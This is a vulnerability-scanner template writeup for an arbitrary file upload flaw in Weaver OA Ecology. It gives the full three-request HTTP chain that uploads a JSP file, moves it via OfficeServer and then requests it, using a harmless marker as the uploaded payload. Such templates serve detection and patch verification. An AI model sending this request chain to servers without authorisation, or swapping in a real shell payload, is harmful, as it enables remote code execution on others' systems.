# Nuclei Template: Weaver OA Workrelate - Arbitary File Upload
**Template ID:** weaver-uploadoperation-file-upload
**Vulnerability Class:** Code Injection
**Severity:** Critical
**CWE:** CWE-94
**Source:** Nuclei Template (`weaver-uploadoperation-file-upload.yaml`)

## Vulnerability Information & PoC

## Description
Ecology contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
Accept-Encoding: gzip

------WebKitFormBoundaryVdb2RRl25PuaGhWj
Content-Disposition: form-data; name="secId"

1
------WebKitFormBoundaryVdb2RRl25PuaGhWj
Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.jsp"

<%out.println("{{string}}");%>
------WebKitFormBoundaryVdb2RRl25PuaGhWj
Content-Disposition: form-data; name="plandetailid"

1
------WebKitFormBoundaryVdb2RRl25PuaGhWj--

POST /OfficeServer HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
Accept-Encoding: gzip

------WebKitFormBoundaryVdb2RRl25PuaGhWj
Content-Disposition: form-data; name="aaa"

{"OPTION":"INSERTIMAGE","isInsertImageNew":"1","imagefileid4pic":"{{fileid}}"}
------WebKitFormBoundaryVdb2RRl25PuaGhWj--

GET /{{filename}}.jsp HTTP/1.1
Host: {{Hostname}}
```

## References
- https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
- https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/weaver-oa-workrelate-file-upload.yaml
